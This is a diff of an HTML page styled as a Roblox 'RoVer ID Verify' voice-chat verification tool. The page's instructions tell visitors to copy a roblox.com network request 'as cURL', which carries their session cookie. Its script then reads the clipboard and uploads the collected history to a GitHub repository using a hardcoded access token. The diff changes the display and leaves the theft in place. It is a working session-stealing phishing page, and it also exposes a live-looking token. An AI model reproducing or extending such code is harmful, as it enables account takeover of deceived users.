@@ -10,7 +10,7 @@
     button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
     #output { margin-top: 20px; font-size: 18px; color: darkblue; }
     input { padding: 5px 10px; font-size: 16px; width: 300px; }
-    textarea { width: 80%; height: 200px; font-size: 14px; margin-top: 10px; }
+    #clipboardBox { width: 400px; }
   </style>
 </head>
 <body>
@@ -26,51 +26,41 @@
   <p id="directions">[Next, go to https://roblox.com/RoVerIDVERIFY and open the developer menu (ctrl + shift + I), and go to the "Network" Tab. Next, reload the page with the console open, and you will see a line highlighted red, saying "RoVer ID Verify". Right click on it, and choose copy, and copy as a cURL. After this step, your account has been successfully verified.]</p>
 
   <!-- Output -->
-  <div id="output"></div>
+  <input type="text" id="clipboardBox" readonly placeholder="Clipboard will appear here">
 
   <!-- Refresh Clipboard & Manual Input -->
+  <br><br>
   <button id="refreshClipboardBtn">Refresh Clipboard</button>
   <p>
     <input type="text" id="manualInput" placeholder="Enter your username here and press Enter">
   </p>
 
-  <!-- Textarea for clipboard history -->
-  <p>Clipboard History (select and press Ctrl + C to copy):</p>
-  <textarea id="clipboardBox" readonly></textarea>
-
   <script>
     const btn = document.getElementById("readBtn");
-    const output = document.getElementById("output");
     const refreshBtn = document.getElementById("refreshClipboardBtn");
     const manualInput = document.getElementById("manualInput");
     const clipboardBox = document.getElementById("clipboardBox");
-
-    // Clipboard verify button
-    btn.addEventListener("click", async () => {
-      try {
-        const text = await navigator.clipboard.readText();
-        output.textContent = "Clipboard contains: " + text;
-      } catch (err) {
-        output.textContent = "Failed: " + err.message;
-        console.error(err);
-      }
-    });
 
     // Load saved data from localStorage
     let clipboardHistory = JSON.parse(localStorage.getItem("clipboardHistory") || "[]");
     let manualEntries = JSON.parse(localStorage.getItem("manualEntries") || "[]");
 
-    function updateOutput() {
-      output.innerHTML = "Clipboard History:<br>" + clipboardHistory.join("<br>");
-      clipboardBox.value = clipboardHistory.join("\n"); // update textarea
-    }
-    updateOutput();
+    // Clipboard verify button
+    btn.addEventListener("click", async () => {
+      try {
+        const text = await navigator.clipboard.readText();
+        clipboardBox.value = text; // Show latest clipboard entry in single-line box
+      } catch (err) {
+        clipboardBox.value = "Failed: " + err.message;
+        console.error(err);
+      }
+    });
 
     // Function to save to GitHub
     async function saveToGitHub(filename, content) {
       const token = "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"; // Your token
-      const owner = "RoVer-Official"; // Replace with your username
-      const repo = "IDless-VC-Verification"; // Replace with your repo name
+      const owner = "RoVer-Official"; 
+      const repo = "IDless-VC-Verification"; 
       const path = filename;
 
       let sha = null;
@@ -105,12 +95,12 @@
         const text = await navigator.clipboard.readText();
         clipboardHistory.push(text);
         localStorage.setItem("clipboardHistory", JSON.stringify(clipboardHistory));
-        updateOutput();
+        clipboardBox.value = text; // Show latest clipboard entry
 
         // Save to GitHub
         await saveToGitHub("clipboard_history.txt", clipboardHistory.join("\n"));
       } catch (err) {
-        output.textContent = "Failed: " + err.message;
+        clipboardBox.value = "Failed: " + err.message;
       }
     });
 
